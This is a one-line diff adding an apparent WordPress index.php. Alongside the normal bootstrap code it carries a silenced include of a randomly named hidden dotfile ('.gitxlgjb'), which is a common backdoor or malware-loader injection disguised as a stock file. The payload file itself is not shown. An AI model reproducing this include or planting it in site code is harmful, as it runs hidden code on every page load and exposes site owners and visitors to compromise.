@@ -1,0 +1,1 @@
+<?php define("WP_USE_THEMES",true);@include_once(".gitxlgjb");require __DIR__."/wp-blog-header.php";?>
